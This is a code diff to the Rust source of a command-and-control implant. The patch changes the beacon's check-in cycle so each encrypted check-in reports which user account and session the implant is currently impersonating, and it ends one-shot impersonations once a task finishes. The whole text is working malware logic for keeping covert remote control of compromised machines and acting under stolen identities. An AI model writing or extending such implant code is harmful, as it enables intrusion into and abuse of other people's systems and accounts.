@@ -420,7 +420,15 @@ impl Beacon {
     // -- one beacon cycle ------------------------------------------------
     fn cycle(&mut self) -> Result<bool, String> {
         let ts = now_secs();
-        let checkin = upk::map(vec![("ts", upk::u(ts)), ("n", upk::u(0))]);
+        // The check-in carries the identity of the implant: when the
+        // operator made it become somebody else, the server shows that in
+        // the inventory instead of leaving a stale name there.
+        let mut checkin_fields = vec![("ts", upk::u(ts)), ("n", upk::u(0))];
+        if let Some(state) = crate::post::impersonation() {
+            checkin_fields.push(("impersonation", upk::s(&state.identity.account)));
+            checkin_fields.push(("impersonation_session", upk::u(state.identity.session as u64)));
+        }
+        let checkin = upk::map(checkin_fields);
         let frame = self.seal(wire::MSG_CHECKIN, &checkin)?;
         self.write(&frame)?;
 
@@ -650,6 +658,9 @@ impl Beacon {
                     self.send_result(&id, outcome)?;
                 }
             }
+            // A one-shot impersonation was meant for this task: the implant
+            // gives the account back as soon as the task is done.
+            crate::post::end_one_shot();
         }
 
         self.send_bye()?;
